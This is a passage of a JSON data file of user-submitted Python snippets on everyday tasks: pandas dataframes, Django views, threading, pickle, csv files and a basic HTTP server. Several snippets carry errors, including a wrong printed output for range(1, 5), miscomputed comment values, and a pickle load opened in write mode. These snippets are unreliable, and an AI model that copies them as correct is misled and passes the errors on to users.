    "description": "from requests.models import Response  the_response = Response() the_response.code = \"expired\" the_response.error_type = \"expired\" the_response.status_code = 400 the_response._content = b'{ \"key\" : \"a\" }'  print(the_response.json())\n",
    "reg_date": "2021-10-12T11:28:36.000Z"
  },
  {
    "id": 660,
    "keyword": null,
    "link": null,
    "title": " create a sequence of numbers in python",
    "description": "list(range(11, 17)) #Creates the following list [11, 12, 13, 14, 15, 16]\nstep = 2 vec = [1,2,3,4,5] vec2 = [i/step for i in range(len(vec))]  # vec2 = [0.5, 1, 1.5, 2, 2.5]\n",
    "reg_date": "2021-10-12T11:28:36.000Z"
  },
  {
    "id": 661,
    "keyword": null,
    "link": null,
    "title": " create a server in python",
    "description": "# If Python version is 3.X python3 -m http.server  # If Python version is 2.X python -m SimpleHTTPServer\n# Python 3 server example from http.server  import BaseHTTPRequestHandler, HTTPServer import time hostName = \"localhost\" serverPort = 8080 class MyServer(BaseHTTPRequestHandler):  \tdef do_GET(self):     \tself.send_response(200)         self.send_header(\"Content-type\", \"text/html\")         self.end_headers()         self.wfile.write(bytes(\"<html><head><title>https://pythonbasics.org</title></head>\", \"utf-8\"))         self.wfile.write(bytes(\"<p>Request: %s</p>\" % self.path, \"utf-8\"))         self.wfile.write(bytes(\"<body>\", \"utf-8\"))         self.wfile.write(bytes(\"<p>This is an example web server.</p>\", \"utf-8\"))         self.wfile.write(bytes(\"</body></html>\", \"utf-8\"))     if __name__ == \"__main__\":     \twebServer = HTTPServer((hostName, serverPort), MyServer)         print(\"Server started http://%s:%s\" % (hostName, serverPort))         try:         webServer.serve_forever()         except KeyboardInterrupt:         pass         webServer.server_close()         print(\"Server stopped.\")\nimport http.server import socketserver  PORT = 8000  Handler = http.server.SimpleHTTPRequestHandler  with socketserver.TCPServer((\"\", PORT), Handler) as httpd:     print(\"serving at port\", PORT)     httpd.serve_forever() \nOn Ubuntu go to Commands and hit these two commands-> cd folderName python3 -m http.server 8080\npython -m SimpleHTTPServer 8000\n",
    "reg_date": "2021-10-12T11:28:36.000Z"
  },
  {
    "id": 662,
    "keyword": null,
    "link": null,
    "title": " create a window turtle python",
    "description": "import turtle  # Create the window wn = turtle.Screen() wn.setup(800, 600) # Dimensions wn.bgcolor(\"black\") # Background color wn.title(\"Window\") # Title  # Main loop while True:   window.update() # Update window\n",
    "reg_date": "2021-10-12T11:28:36.000Z"
  },
  {
    "id": 663,
    "keyword": null,
    "link": null,
    "title": " create additional rows for missing dates pandas",
    "description": "In [11]: idx = pd.period_range(min(df.date), max(df.date))     ...: results.reindex(idx, fill_value=0)     ...: Out[11]:                   f1        f2        f3        f4 2000-01-01  2.049157  1.962635  2.756154  2.224751 2000-01-02  2.675899  2.587217  1.540823  1.606150 2000-01-03  0.000000  0.000000  0.000000  0.000000 2000-01-04  0.000000  0.000000  0.000000  0.000000 2000-01-05  0.000000  0.000000  0.000000  0.000000 2000-01-06  0.000000  0.000000  0.000000  0.000000 2000-01-07  0.000000  0.000000  0.000000  0.000000 2000-01-08  0.000000  0.000000  0.000000  0.000000 2000-01-09  0.000000  0.000000  0.000000  0.000000 2000-01-10  0.000000  0.000000  0.000000  0.000000 2000-01-11  0.000000  0.000000  0.000000  0.000000 2000-01-12  0.000000  0.000000  0.000000  0.000000 2000-01-13  0.000000  0.000000  0.000000  0.000000 2000-01-14  0.000000  0.000000  0.000000  0.000000 2000-01-15  0.000000  0.000000  0.000000  0.000000 2000-01-16  0.000000  0.000000  0.000000  0.000000 2000-01-17  0.000000  0.000000  0.000000  0.000000 2000-01-18  0.000000  0.000000  0.000000  0.000000 2000-01-19  0.000000  0.000000  0.000000  0.000000 2000-01-20  0.000000  0.000000  0.000000  0.000000 2000-01-21  0.000000  0.000000  0.000000  0.000000 2000-01-22  0.000000  0.000000  0.000000  0.000000 2000-01-23  0.000000  0.000000  0.000000  0.000000 2000-01-24  0.000000  0.000000  0.000000  0.000000 2000-01-25  0.000000  0.000000  0.000000  0.000000 2000-01-26  0.000000  0.000000  0.000000  0.000000 2000-01-27  0.000000  0.000000  0.000000  0.000000 2000-01-28  0.000000  0.000000  0.000000  0.000000 2000-01-29  0.000000  0.000000  0.000000  0.000000 2000-01-30  0.000000  0.000000  0.000000  0.000000 2000-01-31  0.000000  0.000000  0.000000  0.000000 2000-02-01  0.000000  0.000000  0.000000  0.000000 2000-02-02  0.000000  0.000000  0.000000  0.000000 2000-02-03  0.000000  0.000000  0.000000  0.000000 2000-02-04  1.856158  2.892620  2.986166  2.793448\n",
    "reg_date": "2021-10-12T11:28:36.000Z"
  },
  {
    "id": 664,
    "keyword": null,
    "link": null,
    "title": " create age-groups in pandas",
    "description": "X_train_data = pd.DataFrame({'Age':[0,2,4,13,35,-1,54]})  bins= [0,2,4,13,20,110] labels = ['Infant','Toddler','Kid','Teen','Adult'] X_train_data['AgeGroup'] = pd.cut(X_train_data['Age'], bins=bins, labels=labels, right=False) print (X_train_data)    Age AgeGroup 0    0   Infant 1    2  Toddler 2    4      Kid 3   13     Teen 4   35    Adult 5   -1      NaN 6   54    Adult\n",
    "reg_date": "2021-10-12T11:28:36.000Z"
  },
  {
    "id": 665,
    "keyword": null,
    "link": null,
    "title": " create an array from 1 to n python",
    "description": "a_list = list(range(1, 5))  print(a_list) [1,2,3,4,5]\nnList = list(range(1, n+1))\n",
    "reg_date": "2021-10-12T11:28:36.000Z"
  },
  {
    "id": 666,
    "keyword": null,
    "link": null,
    "title": " create an array string using for in python",
    "description": "a = [\"a_\" + str(i) for i in range(10)] print(a)\n",
    "reg_date": "2021-10-12T11:28:37.000Z"
  },
  {
    "id": 667,
    "keyword": null,
    "link": null,
    "title": " create an array with same value python",
    "description": ">> import numpy as np >> fives = np.repeat(5, 10) #This creates an array of the number 5 repeated 10 times.\n>>> np.full((3, 5), 7) array([[ 7.,  7.,  7.,  7.,  7.],        [ 7.,  7.,  7.,  7.,  7.],        [ 7.,  7.,  7.,  7.,  7.]])  >>> np.full((3, 5), 7, dtype=int) array([[7, 7, 7, 7, 7],        [7, 7, 7, 7, 7],        [7, 7, 7, 7, 7]])\n>> import numpy as np  >> np.full(     shape=10,     fill_value=3,     dtype=np.int)  array([3, 3, 3, 3, 3, 3, 3, 3, 3, 3])\n>>> np.full((3, 5), 7) array([[ 7.,  7.,  7.,  7.,  7.],        [ 7.,  7.,  7.,  7.,  7.],        [ 7.,  7.,  7.,  7.,  7.]])  >>> np.full((3, 5), 7, dtype=int) array([[7, 7, 7, 7, 7],        [7, 7, 7, 7, 7],        [7, 7, 7, 7, 7]]) \n",
    "reg_date": "2021-10-12T11:28:37.000Z"
  },
  {
    "id": 668,
    "keyword": null,
    "link": null,
    "title": " create calculator in python",
    "description": "from tkinter import * import random import time  def btnClick(numbers): \tglobal operator \toperator = operator + str(numbers) \ttext_Input.set(operator)  def bcd(): \tglobal operator \toperator = \"\" \ttext_Input.set(\"\")  def bei(): \tglobal operator \tsumup = str(eval(operator)) \ttext_Input.set(sumup) \toperator = sumup   root = Tk() root.title(\"Calculator\") root.resizable(False, False)  operator = \"\" text_Input = StringVar()  #AnsShow textDisplay = Entry(root, font = ('arial', 20, 'bold'), textvariable = text_Input, bd = 30, insertwidth = 4, bg = \"red\", justify = 'right') textDisplay.grid(columnspan = 4)  #button btn7 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"7\", command = lambda:btnClick(7)).grid(row = 1, column = 0)  btn8 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"8\", command = lambda:btnClick(8)).grid(row = 1, column = 1)  btn9 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"9\", command = lambda:btnClick(9)).grid(row = 1, column = 2)  Add = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"+\", command = lambda:btnClick(\"+\")).grid(row = 1, column = 3)  #============================================================================================================================# btn4 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"4\", command = lambda:btnClick(4)).grid(row = 2, column = 0)  btn5 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"5\", command = lambda:btnClick(5)).grid(row = 2, column = 1)  btn6 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"6\", command = lambda:btnClick(6)).grid(row = 2, column = 2)  Sub = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"-\", command = lambda:btnClick(\"-\")).grid(row = 2, column = 3)  #===============================================================================================================================# btn1 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"1\", command = lambda:btnClick(1)).grid(row = 3, column = 0)  btn2 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"2\", command = lambda:btnClick(2)).grid(row = 3, column = 1)  btn3 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"3\", command = lambda:btnClick(3)).grid(row = 3, column = 2)  Multiply = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"*\", command = lambda:btnClick(\"*\")).grid(row = 3, column = 3)  #==================================================================================================================================# btn0 = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"0\", command = lambda:btnClick(0)).grid(row = 4, column = 0)  equal = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"=\", command = bei).grid(row = 4, column = 1)  divide = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"/\", command = lambda:btnClick(\"/\")).grid(row = 4, column = 2)  clear = Button(root, padx = 16, bd = 8, fg = \"black\", bg = \"red\", font = ('arial', 20, 'bold'), text = \"c\", command = bcd).grid(row = 4, column = 3)  root.mainloop()\n#Store number variables for the two numbers  num1 = input('Enter first number: ') num2 = input('Enter second number: ')  #the sum of the two numbers variable sum = float(num1) + float(num2) sum2 = float(num1) - float(num2) sum3 = float(num1) * float(num2) sum4 = float(num1) / float(num2)  #what operator to use choice = input('Enter an operator, + = addition, - = subtraction, * = multiplication and / = division: ') #different sums based on the operators if choice == '+':   print('The sum of {0} and {1} is {2}'.format(num1, num2, sum))    if choice == '-':     print('The sum of {0} and {1} is {2}'.format(num1, num2, sum2))  if choice == '*':     print('The sum of {0} and {1} is {2}'.format(num1, num2, sum3))  if choice == '/':     print('The sum of {0} and {1} is {2}'.format(num1, num2, sum4))  \nSelect operation. 1.Add 2.Subtract 3.Multiply 4.Divide Enter choice(1/2/3/4): 3 Enter first number: 15 Enter second number: 14 15.0 * 14.0 = 210.0 \nnum_one = int(input(\"Enter 1st number: \"))  op = input(\"Enter operator: \")  num_two = int(input(\"Enter 2nd number: \"))  if op == \"+\":     print(num_one + num_two) elif op == \"-\":     print(num_one - num_two) elif op == \"*\" or op == \"x\":     print(num_one * num_two) elif op == \"/\":     print(num_one / num_two) \nprint(\"Enter Your Choice 1(Add)/2(Sub)/3(Divide)/4(Multiply)\") num = int(input()) if num == 1:     print(\"Enter Number 1 : \")     add1  = int(input())     print(\"Enter Number 2 : \")     add2 = int(input())     sum = add1 + add2     print(\"The Sum Is \", sum) elif num == 2:     print(\"Enter Number 1 : \")     sub1  = int(input())     print(\"Enter Number 2 : \")     sub2 = int(input())     difference = sub1 - sub2     print(\"The Difference Is \", difference) elif num == 3:     print(\"Enter Number 1 : \")     div1  = float(input())     print(\"Enter Number 2 : \")     div2 = float(input())     division = div1 / div2     print(\"The Division Is \", division) elif num == 4:     print(\"Enter Number 1 : \")     mul1 = int(input())     print(\"Enter Number 2 : \")     mul2 = int(input())     multiply = mul1 * mul2     print(\"The Difference Is \", multiply) else:     print(\"enter a valid Number\")\n# This will be one of the most advanced results you will find.  # We will be using classes and simple operators like +,-,*,/  class Calculator:   def addition(a,b):     return a + b    def subtraction(a,b):     if a<b:       return b - a     else:       return a - b    def multiplication(a,b):     return a * b    def division(a,b):\t     if a<b:       return b / a     else:       return a / b  # You can do this in terminal. <C:/Users/username>python >>> from main import Calculator >>> result = Calculator.[addition|subtraction|multiplication|division](anyNumber, anyNumber) >>> print(result)\n",
    "reg_date": "2021-10-12T11:28:37.000Z"
  },
  {
    "id": 669,
    "keyword": null,
    "link": null,
    "title": " create conda env with specific python version",
    "description": "conda create -n \"myenv\" python=3.3.0 \n// virtualenv conda install -c anaconda virtualenv  // virtualenvwrapper conda install -c eumetsat virtualenvwrapper\n",
    "reg_date": "2021-10-12T11:28:37.000Z"
  },
  {
    "id": 670,
    "keyword": null,
    "link": null,
    "title": " create csv file python",
    "description": "# This action requires the 'csv' module import csv  # The basic usage is to first define the rows of the csv file: row_list = [[\"SN\", \"Name\", \"Contribution\"],              [1, \"Linus Torvalds\", \"Linux Kernel\"],              [2, \"Tim Berners-Lee\", \"World Wide Web\"],              [3, \"Guido van Rossum\", \"Python Programming\"]]  # And then use the following to create the csv file: with open('protagonist.csv', 'w', newline='') as file:     writer = csv.writer(file)     writer.writerows(row_list) # This will create a csv file in the current directory\nimport csv  with open('names.csv', 'w') as csvfile:     fieldnames = ['first_name', 'last_name']     writer = csv.DictWriter(csvfile, fieldnames=fieldnames)      writer.writeheader()     writer.writerow({'first_name': 'Baked', 'last_name': 'Beans'})     writer.writerow({'first_name': 'Lovely', 'last_name': 'Spam'})     writer.writerow({'first_name': 'Wonderful', 'last_name': 'Spam'}) \nwith open(r'c:\\dl\\FrameRecentSessions.csv') as csv_file:     csv_reader = csv.reader(csv_file, delimiter=',')     line_count = 0     for row in csv_reader:         if line_count == 0:             print(f'Column names are {\", \".join(row)}')             line_count += 1         else:             print(f'\\t{row[0]} works in the {row[1]} department, and was born in {row[2]}.')             line_count += 1     print(f'Processed {line_count} lines.')\nimport csv  with open('employee_birthday.txt') as csv_file:     csv_reader = csv.reader(csv_file, delimiter=',')     line_count = 0     for row in csv_reader:         if line_count == 0:             print(f'Column names are {\", \".join(row)}')             line_count += 1         else:             print(f'\\t{row[0]} works in the {row[1]} department, and was born in {row[2]}.')             line_count += 1     print(f'Processed {line_count} lines.') \nimport pandas as pd  df = pd.read_csv (r'Path where the CSV file is stored\\File name.csv') print (df) \n##text=List of strings to be written to file with open('csvfile.csv','wb') as file:     for line in text:         file.write(line)         file.write('\\n') \n",
    "reg_date": "2021-10-12T11:28:37.000Z"
  },
  {
    "id": 671,
    "keyword": null,
    "link": null,
    "title": " create data dir in python",
    "description": "import os  # define the name of the directory to be created path = \"/tmp/year\"  try:     os.mkdir(path) except OSError:     print (\"Creation of the directory %s failed\" % path) else:     print (\"Successfully created the directory %s \" % path) \n",
    "reg_date": "2021-10-12T11:28:37.000Z"
  },
  {
    "id": 672,
    "keyword": null,
    "link": null,
    "title": " create dataframe from csv and name columns pandas",
    "description": "# create list and enter header values  header_list = [\"Val1\", \"Val2\", \"Val3\"] # create a dataframe ex: df and tell pandas to read in your csv # in same line assign your list to the names= df = pd.read_csv(\"sample_file.csv\", names=header_list)\n",
    "reg_date": "2021-10-12T11:28:37.000Z"
  },
  {
    "id": 673,
    "keyword": null,
    "link": null,
    "title": " create dataframe with column names pandas",
    "description": "In [4]: import pandas as pd In [5]: df = pd.DataFrame(columns=['A','B','C','D','E','F','G']) In [6]: df Out[6]: Empty DataFrame Columns: [A, B, C, D, E, F, G] Index: []\n",
    "reg_date": "2021-10-12T11:28:37.000Z"
  },
  {
    "id": 674,
    "keyword": null,
    "link": null,
    "title": " create dataframe with date",
    "description": "import pandas as pd import numpy as np  np.random.seed(0) # create an array of 5 dates starting at '2015-02-24', one per minute rng = pd.date_range('2015-02-24', periods=5, freq='T') df = pd.DataFrame({ 'Date': rng, 'Val': np.random.randn(len(rng)) })   print (df) # Output: #                  Date       Val # 0 2015-02-24 00:00:00  1.764052 # 1 2015-02-24 00:01:00  0.400157 # 2 2015-02-24 00:02:00  0.978738 # 3 2015-02-24 00:03:00  2.240893 # 4 2015-02-24 00:04:00  1.867558  # create an array of 5 dates starting at '2015-02-24', one per day rng = pd.date_range('2015-02-24', periods=5, freq='D') df = pd.DataFrame({ 'Date': rng, 'Val' : np.random.randn(len(rng))})   print (df) # Output: #         Date       Val # 0 2015-02-24 -0.977278 # 1 2015-02-25  0.950088 # 2 2015-02-26 -0.151357 # 3 2015-02-27 -0.103219 # 4 2015-02-28  0.410599  # create an array of 5 dates starting at '2015-02-24', one every 3 years rng = pd.date_range('2015-02-24', periods=5, freq='3A') df = pd.DataFrame({ 'Date': rng, 'Val' : np.random.randn(len(rng))})    print (df) # Output: #         Date       Val # 0 2015-12-31  0.144044 # 1 2018-12-31  1.454274 # 2 2021-12-31  0.761038 # 3 2024-12-31  0.121675 # 4 2027-12-31  0.443863 \n",
    "reg_date": "2021-10-12T11:28:37.000Z"
  },
  {
    "id": 675,
    "keyword": null,
    "link": null,
    "title": " create dict from json file python",
    "description": "import json with open('result.json', 'w') as fp:     json.dump(sample, fp)\nimport json  with open(\"data.json\", \"r\") as json_file:     my_dict = json.load(json_file)\nimport json  with open('data.json', 'w') as fp:     json.dump(data, fp)\nimport json            # Data to be written    dictionary ={      \"id\": \"04\",      \"name\": \"sunil\",      \"depatment\": \"HR\" }            # Serializing json     json_object = json.dumps(dictionary, indent = 4)    print(json_object)   \n",
    "reg_date": "2021-10-12T11:28:37.000Z"
  },
  {
    "id": 676,
    "keyword": null,
    "link": null,
    "title": " create dictionary python from two lists",
    "description": ">>> keys = ['a', 'b', 'c'] >>> values = [1, 2, 3] >>> dictionary = dict(zip(keys, values)) >>> print(dictionary) {'a': 1, 'b': 2, 'c': 3}\nkeys = ['a', 'b', 'c'] values = [1, 2, 3] dictionary = dict(zip(keys, values))\n",
    "reg_date": "2021-10-12T11:28:38.000Z"
  },
  {
    "id": 677,
    "keyword": null,
    "link": null,
    "title": " create document google docs api python",
    "description": "\"\"\" \tNotes:     \tAnything else in the requests other than the title will be ignored.         If you want to add text to the new document, you must access the \"documentId\" key and then do a batchupdate \tReplace:     \tcreds = user credentials         title = document title \"\"\"  # Import Google Client libraries from googleapiclient.discovery import build  # Build service (docs api v1 in our case) service = build('docs', 'v1', credentials=creds)  # Make a request body requests = {   'title': title }  # Create the document doc = service.documents().create(body=requests).execute()\n",
    "reg_date": "2021-10-12T11:28:38.000Z"
  },
  {
    "id": 678,
    "keyword": null,
    "link": null,
    "title": " create empty dataframe with column names from list",
    "description": "df = pd.DataFrame(columns = column_names)\n",
    "reg_date": "2021-10-12T11:28:38.000Z"
  },
  {
    "id": 679,
    "keyword": null,
    "link": null,
    "title": " create empty function python",
    "description": "# Correct way of writing empty function  # in Python def fun():      pass \n",
    "reg_date": "2021-10-12T11:28:38.000Z"
  },
  {
    "id": 680,
    "keyword": null,
    "link": null,
    "title": " create folder python",
    "description": "# This requires Python&rsquo;s OS module import os  # 'mkdir' creates a directory in current directory. os.mkdir('tempDir')  # can also be used with a path, if the other folders exist. os.mkdir('tempDir2/temp2/temp')  # 'makedirs' creates a directory with it's path, if applicable. os.makedirs('tempDir2/temp2/temp') \nimport os  # define the name of the directory to be created path = \"/tmp/year\"  try:     os.mkdir(path) except OSError:     print (\"Creation of the directory %s failed\" % path) else:     print (\"Successfully created the directory %s \" % path) \nnewpath = r'C:\\Program Files\\arbitrary'  if not os.path.exists(newpath):     os.makedirs(newpath)\nnewpath = 'C:\\Program Files\\arbitrary'  if not os.path.exists(newpath):     os.makedirs(newpath) \nimport os directory = \"Krishna\" path_dir = \"C:/Users/../Desktop/current_dir/\" if not os.path.exists(directory): \tos.mkdir(os.path.join(path_dir, directory))\n# Python program to create directory using os.makedirs() method  import os  # Directory path dir_path = \"C:/Projects/Tryouts/test/sample/mydir\" os.makedirs(dir_path) print(\"Directory '% s' created\" % dir_path)   # Directory path dir_path2 = \"C:/Projects/Tryouts/test/sample/mydir2\" # mode mode = 0o666 os.makedirs(dir_path2, mode) print(\"Directory '% s' created\" % dir_path2) \n",
    "reg_date": "2021-10-12T11:28:38.000Z"
  },
  {
    "id": 681,
    "keyword": null,
    "link": null,
    "title": " create list integers",
    "description": "list(range(11, 17)) [11, 12, 13, 14, 15, 16]\n",
    "reg_date": "2021-10-12T11:28:38.000Z"
  },
  {
    "id": 682,
    "keyword": null,
    "link": null,
    "title": " create new column using dictionary padnas",
    "description": "U 111 112 112  d = {112: 'a', 111: 'b'} df['B'] = df['A'].map(d) df Out[248]:      A    B 0  111    a 1  112    b\n",
    "reg_date": "2021-10-12T11:28:38.000Z"
  },
  {
    "id": 683,
    "keyword": null,
    "link": null,
    "title": " create new django app",
    "description": "python manage.py startapp app_name\npython manage.py startapp # name of the app\ndjango-admin startproject mysite\n$ python manage.py startapp app_name\n$ python manage.py startapp polls \n",
    "reg_date": "2021-10-12T11:28:38.000Z"
  },
  {
    "id": 684,
    "keyword": null,
    "link": null,
    "title": " create new thread python",
    "description": "from threading import Thread from time import sleep  def threaded_function(arg):     for i in range(arg):         print(\"running\")         sleep(1)   if __name__ == \"__main__\":     thread = Thread(target = threaded_function, args = (10, ))     thread.start()     thread.join()     print(\"thread finished...exiting\")\n# A minimal threading example with function calls import threading import time  def loop1_10():     for i in range(1, 11):         time.sleep(1)         print(i)  threading.Thread(target=loop1_10).start()  # A minimal threading example with an object import threading import time   class MyThread(threading.Thread):     def run(self):                                         # Default called function with mythread.start()         print(\"{} started!\".format(self.getName()))        # \"Thread-x started!\"         time.sleep(1)                                      # Pretend to work for a second         print(\"{} finished!\".format(self.getName()))       # \"Thread-x finished!\"  def main():     for x in range(4):                                     # Four times...         mythread = MyThread(name = \"Thread-{}\".format(x))  # ...Instantiate a thread and pass a unique ID to it         mythread.start()                                   # ...Start the thread, run method will be invoked         time.sleep(.9)                                     # ...Wait 0.9 seconds before starting another  if __name__ == '__main__':     main()\nimport threading, time  def worker():     \"\"\"thread worker function\"\"\"     print('Worker')     return  threads = [] for i in range(5):     t = threading.Thread(target=worker)     threads.append(t)     t.start()     print('Thread')     \n#!/usr/bin/python  import thread import time  # Define a function for the thread def print_time( threadName, delay):    count = 0    while count < 5:       time.sleep(delay)       count += 1       print \"%s: %s\" % ( threadName, time.ctime(time.time()) )  # Create two threads as follows try:    thread.start_new_thread( print_time, (\"Thread-1\", 2, ) )    thread.start_new_thread( print_time, (\"Thread-2\", 4, ) ) except:    print \"Error: unable to start thread\"  while 1:    pass\n",
    "reg_date": "2021-10-12T11:28:38.000Z"
  },
  {
    "id": 685,
    "keyword": null,
    "link": null,
    "title": " create or update django models",
    "description": "obj, created = Person.objects.update_or_create(     first_name='John', last_name='Lennon',     defaults={'first_name': 'Bob'}, ) # If person exists with first_name='John' & last_name='Lennon' then update first_name='Bob' # Else create new person with first_name='Bob' & last_name='Lennon' \n",
    "reg_date": "2021-10-12T11:28:38.000Z"
  },
  {
    "id": 686,
    "keyword": null,
    "link": null,
    "title": " create pandas dataframe with random numbers",
    "description": "#using numpy's randint df = pd.DataFrame(np.random.randint(0,100,size=(15, 4)), columns=list('ABCD')) \n",
    "reg_date": "2021-10-12T11:28:39.000Z"
  },
  {
    "id": 687,
    "keyword": null,
    "link": null,
    "title": " create period pandas",
    "description": "#Creating a period which has a default frequency of 'M' Months period = pd.Period('2017-1')\n",
    "reg_date": "2021-10-12T11:28:39.000Z"
  },
  {
    "id": 688,
    "keyword": null,
    "link": null,
    "title": " create pickle file python",
    "description": "import pickle #credits to stack overflow user= blender  a = {'hello': 'world'}  with open('filename.pkl', 'wb') as handle:     pickle.dump(a, handle, protocol=pickle.HIGHEST_PROTOCOL)  with open('filename.pkl', 'rb') as handle:     b = pickle.load(handle)  print (a == b)\nimport pickle file_name='my_file.pkl' f = open(file_name,'wb') pickle.dump(my_data,f) f.close()\nwith open('mypickle.pickle', 'wb') as f:     pickle.dump(some_obj, f)  # note that this will overwrite any existing file # in the current working directory called 'mypickle.pickle' \nPython 3.4.1 (default, May 21 2014, 12:39:51)  [GCC 4.2.1 Compatible Apple LLVM 5.0 (clang-500.2.79)] on darwin Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> mylist = ['I wish to complain about this parrot what I purchased not half an hour ago from this very boutique.', \"Oh yes, the, uh, the Norwegian Blue...What's,uh...What's wrong with it?\", \"I'll tell you what's wrong with it, my lad. 'E's dead, that's what's wrong with it!\", \"No, no, 'e's uh,...he's resting.\"] >>>  >>> import pickle >>>  >>> with open('parrot.pkl', 'wb') as f: ...   pickle.dump(mylist, f) ...  >>>  with open('parrot.pkl', 'wb') as f: ...   new_list = pickle.load(mylist, f)  \nPython 3.4.1 (default, May 21 2014, 12:39:51)  [GCC 4.2.1 Compatible Apple LLVM 5.0 (clang-500.2.79)] on darwin Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> import pickle >>> with open('parrot.pkl', 'rb') as f: ...   mynewlist = pickle.load(f) ...  >>> mynewlist ['I wish to complain about this parrot what I purchased not half an hour ago from this very boutique.', \"Oh yes, the, uh, the Norwegian Blue...What's,uh...What's wrong with it?\", \"I'll tell you what's wrong with it, my lad. 'E's dead, that's what's wrong with it!\", \"No, no, 'e's uh,...he's resting.\"] >>> \n",
    "reg_date": "2021-10-12T11:28:39.000Z"
  },
  {
    "id": 689,
    "keyword": null,
    "link": null,
    "title": " create prive function python",
    "description": "# Declaring private method     def __fun(self):         print(\"Private method\")\n",
    "reg_date": "2021-10-12T11:28:39.000Z"
  },
  {
    "id": 690,
    "keyword": null,
    "link": null,
    "title": " create pyspark session with hive support",
    "description": "from pyspark.sql import SparkSession spark = SparkSession.builder.master(\"yarn\").appName(\"my app\").enableHiveSupport().getOrCreate()\n",
    "reg_date": "2021-10-12T11:28:39.000Z"
  },
  {
    "id": 691,
    "keyword": null,
    "link": null,
    "title": " create python file kali linux",
    "description": "sudo nano test.py  then, paste the exploit and save it\n",
    "reg_date": "2021-10-12T11:28:39.000Z"
  },
  {
    "id": 692,
    "keyword": null,
    "link": null,
    "title": " create random dataframe pandas",
    "description": "import numpy as np import pandas as pd df = pd.DataFrame(np.random.randint(0,100,size=(100, 4)), columns=list('ABCD')) \ndf = df.sample(frac=1).reset_index(drop=True) \n",
    "reg_date": "2021-10-12T11:28:39.000Z"
  },
  {
    "id": 693,
    "keyword": null,
    "link": null,
    "title": " create requirements.txt conda",
    "description": "pip freeze > requirements.txt  # OR  conda list -e > requirements.txt\nconda activate <env> conda install pip pip freeze > requirements.txt\n",
    "reg_date": "2021-10-12T11:28:39.000Z"
  },
  {
    "id": 694,
    "keyword": null,
    "link": null,
    "title": " create requirements.txt python",
    "description": "// capture requirements to install pip freeze > requirements.txt  // install requirements from requirements.txt pip install -r requirements.txt  // or $ env1/bin/pip freeze > requirements.txt $ env2/bin/pip install -r requirements.txt\npip list --format=freeze > requirements.txt\nFor Unix families: pip3 freeze > requirements.txt For Windos: pip freeze > requirements.txt\nnote: yor should be on the same dir as requirements.txt file   pip install -r requirements.txt\npip list --format=freeze > requirements.txt \npip freeze > requirements.txt\n",
    "reg_date": "2021-10-12T11:28:39.000Z"
  },
  {
    "id": 695,
    "keyword": null,
    "link": null,
    "title": " create tenant django",
    "description": "./manage.py tenant_command loaddata --schema=customer1 \n",
    "reg_date": "2021-10-12T11:28:39.000Z"
  },
  {
    "id": 696,
    "keyword": null,
    "link": null,
    "title": " create text file in directory python linux",
    "description": "import os.path f = open(os.path.expanduser(os.path.join(\"~/Desktop\",boyka + \".txt\")), \"a\")\n",
    "reg_date": "2021-10-12T11:28:40.000Z"
  },
  {
    "id": 697,
    "keyword": null,
    "link": null,
    "title": " create text in python if not exists",
    "description": "#It will creates Text file in path directory using name of file.txt import os  path = 'some/path/to/file.txt' if not os.path.exists(path):     with open(path, 'w') as f:     \tf.write('Hello, world') #==== OR === mode = 'a' if os.path.exists(path) else 'w' with open(path, mode) as f:     f.write('Hello, world!\\n')\n#Updated dec 2020 #It will creates Text file in path directory using name of file.txt import os  path = 'some/path/to/file.txt' if not os.path.exists(path):     with open(path, 'w') as f:     \tf.write('Hello, world') #==== OR === mode = 'a' if os.path.exists(path) else 'w' with open(path, mode) as f:     f.write('Hello, world!\\n') \n",
    "reg_date": "2021-10-12T11:28:40.000Z"
  },
  {
    "id": 698,
    "keyword": null,
    "link": null,
    "title": " createview",
    "description": "# Required imports from django.urls import reverse_lazy  class YourView(CreateView): \tmodel \t\t\t= Model     fields \t\t\t= ['your_fields']     template_name \t= 'your_template'     success_url\t\t= reverse_lazy('home')          def form_valid(self, form):         form.instance.user = self.request.user         super(YourView, self).form_valid(form)         return redirect('home')\n",
    "reg_date": "2021-10-12T11:28:40.000Z"
  },
  {
    "id": 699,
    "keyword": null,
    "link": null,
    "title": " createview django",
    "description": "# Required imports from django.urls import reverse_lazy  class YourView(CreateView): \tmodel \t\t\t= Model     fields \t\t\t= ['your_fields']     template_name \t= 'your_template'     success_url\t\t= reverse_lazy('home')          def form_valid(self, form):         form.instance.user = self.request.user         super(YourView, self).form_valid(form)         return redirect('home')\nemp = Employee.objects.get(pk = emp_id) emp.name = 'Somename' emp.save() \n###### views.py ##### from .forms import  CreateArticleForm from django.views.generic import CreateView class ArticleCreateView(CreateView):     form_class = CreateArticleForm     template_name = 'articles/create_article.html'      ###### urls.py  ###### from .views import ArticleCreateView urlpatterns =[ path('articles/create/', ArticleCreateView.as_view()),]\n###### views.py ##### from .models import Article from .forms import  UpdateArticleForm from django.views.generic import UpdateView class ArticleUpdateView(UpdateView):     model = Article     form_class = UpdateArticleForm     